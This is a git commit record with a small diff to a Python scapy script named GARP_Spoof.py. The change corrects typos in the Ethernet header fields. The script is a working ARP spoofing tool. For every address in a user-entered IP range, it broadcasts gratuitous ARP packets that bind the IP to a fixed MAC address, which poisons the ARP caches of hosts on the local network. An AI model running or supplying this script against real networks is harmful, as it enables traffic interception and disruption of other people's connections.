a8284f93ffbc2a2afb5bd830b98b383c56c609e4
m00m1n <33335488+m00m1n@users.noreply.github.com>
2018-05-28 17:49:20 +0700

    Update GARP_Spoof.py

--- GARP_Spoof.py
+++ GARP_Spoof.py
@@ -6,6 +6,6 @@ from scapy.all import *
 
 ip_range = input('Enter IP [ip/netmask] ; ')
 for addr in ipaddress.ip_network(ip_range):
-    L2=Ether(dsr="FF:FF:FF:FF:FF:FF",sec="B8:AC:6F:0C:BA:B9",type=0x806)
+    L2=Ether(dst="FF:FF:FF:FF:FF:FF",src="B8:AC:6F:0C:BA:B9",type=0x806)
     GARP=ARP(pdst=str(addr),psrc=str(addr), op=1 , hwsrc="B8:AC:6F:0C:BA:B9")
     sendp(L2/GARP)
